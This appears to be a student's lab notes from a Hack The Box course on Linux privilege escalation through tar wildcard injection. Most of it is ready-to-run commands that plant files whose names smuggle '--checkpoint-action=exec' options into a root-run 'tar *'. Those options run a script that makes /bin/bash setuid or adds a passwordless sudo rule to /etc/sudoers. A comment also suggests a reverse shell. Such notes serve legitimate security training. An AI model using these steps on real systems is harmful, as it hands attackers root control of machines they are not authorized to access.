---


|Character| Signdicance             |
| ---     | ---                     |
|    ?    | Maches a single char    |
|   [ ]   | ex : [a-z]              |

```bash

htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.

```

Create a Root shell

```bash

touch -- --checkpoint=1 "--checkpoint-action=exec=sh root.sh"

echo "chmod +s /bin/bash" > root.sh
	# Or create a reverse shell.

tar -cvf backup.tar *

```

Become Root

```bash

htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1

```


 

